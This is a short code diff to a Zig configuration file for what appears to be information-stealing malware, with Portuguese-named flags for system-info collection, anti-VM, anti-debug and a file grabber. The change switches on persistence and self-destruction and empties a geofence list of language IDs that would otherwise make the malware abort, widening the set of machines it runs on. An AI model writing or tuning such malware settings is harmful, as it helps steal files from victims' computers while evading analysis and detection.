@@ -37,11 +37,11 @@ pub const coletar_info_sistema = true;
 pub const anti_vm = true;
 pub const anti_debug = true;
 pub const human_interaction = true;
-pub const persistir = false;
-pub const auto_destruir = false;
+pub const persistir = true;
+pub const auto_destruir = true;
 
 // ---- Geofence: abort on any of these host langids ----
-pub const geofence_langids = [_]u16{ 0x0419, 0x0422, 0x0423 };
+pub const geofence_langids = [_]u16{  };
 
 // ---- File grabber ----
 pub const tamanho_max_arquivo: i64 = 5242880;
